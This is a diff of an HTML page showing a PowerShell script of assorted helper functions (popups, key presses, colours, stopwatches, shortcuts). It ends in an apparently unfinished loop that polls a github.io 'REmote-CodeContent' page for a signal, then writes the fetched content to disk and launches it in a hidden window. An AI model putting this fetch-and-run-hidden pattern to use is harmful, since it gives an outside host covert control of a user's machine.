@@ -5,203 +5,195 @@
   </head>
   <body>
 <p>
-#YAGN's addons
-$user = $env:USERNAME
-$innerPath1 = "C:\Users\$user\Desktop"
-$innerPath2 = "C:\Program Files"
-function New-Popup {
-    param ($Text = "", $Title = "", $button = "OK", $Icon = "None")
-    Add-Type -AssemblyName PresentationFramework
-    [System.Windows.MessageBox]::Show($Text, $Title, $Button, $Icon)
-}
-function Press-Key {
-    param ($ASCIInumber)
-    $vol = (New-Object -ComObject WScript.Shell)
-    $vol.SendKeys([char]$ASCIInumber)
-}
-function Get-ASCIINumber {
-    Write-Host "
-    Control Characters:
-0: NUL (Null)
-1: SOH (Start of Heading)
-2: STX (Start of Text)
-3: ETX (End of Text)
-4: EOT (End of Transmission)
-5: ENQ (Enquiry)
-6: ACK (Acknowledge)
-7: BEL (Bell)
-8: BS (Backspace)
-9: TAB (Horizontal Tab)
-10: LF (Line Feed)
-11: VT (Vertical Tab)
-12: FF (Form Feed)
-13: CR (Carriage Return)
-14: SO (Shift Out)
-15: SI (Shift In)
-16–31: Various device control codes
-127: DEL (Delete)
-    Printable Characters:
-32: Space
-33–47: ! '' # $ % & ' ( ) * + , - . /
-48–57: 0–9
-58–64: : ; < = > ? @
-65–90: A–Z
-91–96: [ \ ] ^ _ `
-97–122: a–z
-123–126: { | } ~
-
-    "
-}
-function Replace-String {
-    param ($Str, $Repstr, $Repstrwith)
-    return $Str.Replace($Repstr, $Repstrwith)
-}
-function Get-OwnershipOf {
-    param($Path)
-Get-Acl $Path | Select-Object -ExpandProperty Owner
-} 
-function Get-WebContent {
-    param($website)
-    $a = Invoke-WebRequest $website
-    $content = $a.ParsedHtml.Body.innertext
-    return $content
-}
-function Scan-Computerfor {
-    param($Process)
-    $x = Get-Process
-    if ($x -match $Process) {
-    return $true
-       } else {
-    return $false
-   }
-}
-function square {
-    param($num)
-    return $num*$num
-}
-function squareRootOf {
-    param($Num)
-    $x = [Math]::Sqrt($num)
-    return $x
-}
-function Start-Stopwatch {
-    param($var)
-    return [System.Diagnostics.Stopwatch]::StartNew()
-}
-function Stop-Stopwatch {
-    param($var)
-    $var.Stop()
-}
-function Get-Elapsed {
-    param($var, $Format = "None")
-    if ($Format -eq "Milliseconds") {
-    return $var.ElapsedMilliseconds
-    } elseif ($Format -eq "Ticks") {
-    return $var.ElapsedTicks
-    } elseif ($Format -eq "None") {
-    return $var.Elapsed
-    } else {
-    Write-Host "
-    Use:
-    -Format 'Milliseconds'
-    -Format 'Ticks'
-    -Format 'None'
-    "
-    }
-}
-function Get-RunningProcessPath {
-    param($Process)
-    $x = Get-Process -Name $Process
-    return $x.Path
-}
-function Change-BackgroundColor {
-    param($Color)
-    if ($Color -eq "Black" -or $Color -eq "DarkBlue" -or $Color -eq "DarkGreen" -or $Color -eq "DarkCyan" -or $Color -eq "DarkRed" -or $Color -eq "DarkMagenta" -or $Color -eq "DarkYellow" -or $Color -eq "Gray" -or $Color -eq "DarkGray" -or $Color -eq "Blue" -or $Color -eq "Green" -or $Color -eq "Cyan" -or $Color -eq "Red" -or $Color -eq "Magenta" -or $Color -eq "Yellow" -or $Color -eq "White") {
-    $host.UI.RawUI.BackgroundColor = $Color
-    } else {
-    Write-Error "Not a valid Color. choose from the following:
-    Black 
-    DarkBlue 
-    DarkGreen 
-    DarkCyan 
-    DarkRed 
-    DarkMagenta 
-    DarkYellow 
-    Gray 
-    DarkGray 
-    Blue 
-    Green 
-    Cyan 
-    Red 
-    Magenta 
-    Yellow 
-    White"
-    }
-}
-function Change-ForegroundColor {
-    param($Color)
-    if ($Color -eq "Black" -or $Color -eq "DarkBlue" -or $Color -eq "DarkGreen" -or $Color -eq "DarkCyan" -or $Color -eq "DarkRed" -or $Color -eq "DarkMagenta" -or $Color -eq "DarkYellow" -or $Color -eq "Gray" -or $Color -eq "DarkGray" -or $Color -eq "Blue" -or $Color -eq "Green" -or $Color -eq "Cyan" -or $Color -eq "Red" -or $Color -eq "Magenta" -or $Color -eq "Yellow" -or $Color -eq "White") {
-    $host.UI.RawUI.ForegroundColor = $Color
-    } else {
-    Write-Error "Not a valid Color. choose from the following:
-    Black 
-    DarkBlue 
-    DarkGreen 
-    DarkCyan 
-    DarkRed 
-    DarkMagenta 
-    DarkYellow 
-    Gray 
-    DarkGray 
-    Blue 
-    Green 
-    Cyan 
-    Red 
-    Magenta 
-    Yellow 
-    White"
-    }
-}
-function New-Shortcut {
-    param($TargetPath, $ShortcutPath)
-    $WshShell = New-Object -ComObject WScript.Shell
-    $Shortcut = $WshShell.CreateShortcut($ShortcutPath) 
-    $Shortcut.TargetPath = $TargetPath 
-    $Shortcut.Save() 
-}
-function Set-ShortcutIcon {
-    param($ShortcutPath, $NewIconPath)
-    $WshShell = New-Object -ComObject WScript.Shell
-    $Shortcut = $WshShell.CreateShortcut($ShortcutPath)
-    $Shortcut.IconLocation = $NewIconPath
-    $Shortcut.Save()
-}
-function Invoke-WebContent {
-param($Uri)
-$response = Invoke-WebRequest -Uri $Uri -UseBasicParsing
-$doc = New-Object -ComObject 'HTMLFile'
-$doc.IHTMLDocument2_write($response.Content)
-return $doc.body.innerText
-}
-
-
-
-
-
-$active = $true
-while ($active) {
-$contents = Invoke-WebContent -Uri "https://youraveragegreennoob.github.io/REmote-CodeContent/" #in progress
-$signal = Invoke-WebContent -Uri "https://youraveragegreennoob.github.io/REmote-Signal/" #in progress
-if ($signal -eq "True") {
-Set-Content -Path "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -Value $contents
-Start-Process -FilePath "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -WindowStyle Hidden
-Start-Sleep -Seconds 600
-}
-}
+  #YAGN's addons <br>
+$user = $env:USERNAME<br>
+$innerPath1 = "C:\Users\$user\Desktop"<br>
+$innerPath2 = "C:\Program Files"<br>
+function New-Popup {<br>
+    param ($Text = "", $Title = "", $button = "OK", $Icon = "None")<br>
+    Add-Type -AssemblyName PresentationFramework<br>
+    [System.Windows.MessageBox]::Show($Text, $Title, $Button, $Icon)<br>
+}<br>
+function Press-Key {<br>
+    param ($ASCIInumber)<br>
+    $vol = (New-Object -ComObject WScript.Shell)<br>
+    $vol.SendKeys([char]$ASCIInumber)<br>
+}<br>
+function Get-ASCIINumber {<br>
+    Write-Host "<br>
+    Control Characters:<br>
+0: NUL (Null)<br>
+1: SOH (Start of Heading)<br>
+2: STX (Start of Text)<br>
+3: ETX (End of Text)<br>
+4: EOT (End of Transmission)<br>
+5: ENQ (Enquiry)<br>
+6: ACK (Acknowledge)<br>
+7: BEL (Bell)<br>
+8: BS (Backspace)<br>
+9: TAB (Horizontal Tab)<br>
+10: LF (Line Feed)<br>
+11: VT (Vertical Tab)<br>
+12: FF (Form Feed)<br>
+13: CR (Carriage Return)<br>
+14: SO (Shift Out)<br>
+15: SI (Shift In)<br>
+16–31: Various device control codes<br>
+127: DEL (Delete)<br>
+    Printable Characters:<br>
+32: Space<br>
+33–47: ! '' # $ % & ' ( ) * + , - . /<br>
+48–57: 0–9<br>
+58–64: : ; < = > ? @<br>
+65–90: A–Z<br>
+91–96: [ \ ] ^ _ `<br>
+97–122: a–z<br>
+123–126: { | } ~<br>
+<br>
+    "<br>
+}<br>
+function Replace-String {<br>
+    param ($Str, $Repstr, $Repstrwith)<br>
+    return $Str.Replace($Repstr, $Repstrwith)<br>
+}<br>
+function Get-OwnershipOf {<br>
+    param($Path)<br>
+Get-Acl $Path | Select-Object -ExpandProperty Owner<br>
+} <br>
+function Get-WebContent {<br>
+    param($website)<br>
+    $a = Invoke-WebRequest $website<br>
+    $content = $a.ParsedHtml.Body.innertext<br>
+    return $content<br>
+}<br>
+function Scan-Computerfor {<br>
+    param($Process)<br>
+    $x = Get-Process<br>
+    if ($x -match $Process) {<br>
+    return $true<br>
+       } else {<br>
+    return $false<br>
+   }<br>
+}<br>
+function square {<br>
+    param($num)<br>
+    return $num*$num<br>
+}<br>
+function squareRootOf {<br>
+    param($Num)<br>
+    $x = [Math]::Sqrt($num)<br>
+    return $x<br>
+}<br>
+function Start-Stopwatch {<br>
+    param($var)<br>
+    return [System.Diagnostics.Stopwatch]::StartNew()<br>
+}<br>
+function Stop-Stopwatch {<br>
+    param($var)<br>
+    $var.Stop()<br>
+}<br>
+function Get-Elapsed {<br>
+    param($var, $Format = "None")<br>
+    if ($Format -eq "Milliseconds") {<br>
+    return $var.ElapsedMilliseconds<br>
+    } elseif ($Format -eq "Ticks") {<br>
+    return $var.ElapsedTicks<br>
+    } elseif ($Format -eq "None") {<br>
+    return $var.Elapsed<br>
+    } else {<br>
+    Write-Host "<br>
+    Use:<br>
+    -Format 'Milliseconds'<br>
+    -Format 'Ticks'<br>
+    -Format 'None'<br>
+    "<br>
+    }<br>
+}<br>
+function Get-RunningProcessPath {<br>
+    param($Process)<br>
+    $x = Get-Process -Name $Process<br>
+    return $x.Path<br>
+}<br>
+function Change-BackgroundColor {<br>
+    param($Color)<br>
+    if ($Color -eq "Black" -or $Color -eq "DarkBlue" -or $Color -eq "DarkGreen" -or $Color -eq "DarkCyan" -or $Color -eq "DarkRed" -or $Color -eq "DarkMagenta" -or $Color -eq "DarkYellow" -or $Color -eq "Gray" -or $Color -eq "DarkGray" -or $Color -eq "Blue" -or $Color -eq "Green" -or $Color -eq "Cyan" -or $Color -eq "Red" -or $Color -eq "Magenta" -or $Color -eq "Yellow" -or $Color -eq "White") {<br>
+    $host.UI.RawUI.BackgroundColor = $Color<br>
+    } else {<br>
+    Write-Error "Not a valid Color. choose from the following:<br>
+    Black <br>
+    DarkBlue <br>
+    DarkGreen <br>
+    DarkCyan <br>
+    DarkRed <br>
+    DarkMagenta <br>
+    DarkYellow <br>
+    Gray <br>
+    DarkGray <br>
+    Blue <br>
+    Green <br>
+    Cyan <br>
+    Red <br>
+    Magenta <br>
+    Yellow <br>
+    White"<br>
+    }<br>
+}<br>
+function Change-ForegroundColor {<br>
+    param($Color)<br>
+    if ($Color -eq "Black" -or $Color -eq "DarkBlue" -or $Color -eq "DarkGreen" -or $Color -eq "DarkCyan" -or $Color -eq "DarkRed" -or $Color -eq "DarkMagenta" -or $Color -eq "DarkYellow" -or $Color -eq "Gray" -or $Color -eq "DarkGray" -or $Color -eq "Blue" -or $Color -eq "Green" -or $Color -eq "Cyan" -or $Color -eq "Red" -or $Color -eq "Magenta" -or $Color -eq "Yellow" -or $Color -eq "White") {<br>
+    $host.UI.RawUI.ForegroundColor = $Color<br>
+    } else {<br>
+    Write-Error "Not a valid Color. choose from the following:<br>
+    Black <br>
+    DarkBlue <br>
+    DarkGreen <br>
+    DarkCyan <br>
+    DarkRed <br>
+    DarkMagenta <br>
+    DarkYellow <br>
+    Gray <br>
+    DarkGray <br>
+    Blue <br>
+    Green <br>
+    Cyan <br>
+    Red <br>
+    Magenta <br>
+    Yellow <br>
+    White"<br>
+    }<br>
+}<br>
+function New-Shortcut {<br>
+    param($TargetPath, $ShortcutPath)<br>
+    $WshShell = New-Object -ComObject WScript.Shell<br>
+    $Shortcut = $WshShell.CreateShortcut($ShortcutPath) <br>
+    $Shortcut.TargetPath = $TargetPath <br>
+    $Shortcut.Save() <br>
+}<br>
+function Set-ShortcutIcon {<br>
+    param($ShortcutPath, $NewIconPath)<br>
+    $WshShell = New-Object -ComObject WScript.Shell<br>
+    $Shortcut = $WshShell.CreateShortcut($ShortcutPath)<br>
+    $Shortcut.IconLocation = $NewIconPath<br>
+    $Shortcut.Save()<br>
+}<br>
+function Invoke-WebContent {<br>
+param($Uri)<br>
+$response = Invoke-WebRequest -Uri $Uri -UseBasicParsing<br>
+$doc = New-Object -ComObject 'HTMLFile'<br>
+$doc.IHTMLDocument2_write($response.Content)<br>
+return $doc.body.innerText<br>
+}<br>
+<br>
+<br>
+$active = $true<br>
+while ($active) {<br>
+$contents = Invoke-WebContent -Uri "https://youraveragegreennoob.github.io/REmote-CodeContent/" #in progress<br>
+$signal = Invoke-WebContent -Uri "https://youraveragegreennoob.github.io/REmote-Signal/" #in progress<br>
+if ($signal -eq "True") {<br>
+Set-Content -Path "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -Value $contents<br>
+Start-Process -FilePath "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -WindowStyle Hidden<br>
+}<br>
+}<br>
 </p>
-  <script>
-    const paragraph = document.querySelector('body > p');
-    paragraph.innerHTML = paragraph.innerHTML.replace(/\r?\n/g, '<br>');
-  </script>
   </body>
 </html>
